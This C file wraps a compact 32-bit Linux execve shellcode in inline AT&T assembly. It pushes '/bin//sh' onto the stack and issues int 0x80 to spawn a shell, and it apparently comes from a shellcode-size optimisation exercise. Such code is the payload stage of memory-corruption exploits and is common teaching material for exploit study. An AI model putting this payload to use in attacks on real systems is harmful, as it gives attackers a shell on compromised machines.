/*
 * build 32 bit(-m32) binary on 64 bit machine
 * assembly : at&t syntax (default)
 *
 * gcc -o asm_optimization_shell_21_atnt_new asm_optimization_shell_21_atnt_new.c -m32 -mpreferred-stack-boundary=2
 */
void main()
{
	__asm__(
	"xorl   %ecx, %ecx;"
	"push   $0xb;"
	"pop    %eax;"
	"cdq;"
	"push   %edx;"
	"push   $0x68732f2f;"
	"push   $0x6e69622f;"
	"xchg   %esp,%ebx;"	// == mov %esp, %ebx;
	"int    $0x80;"
	);
}
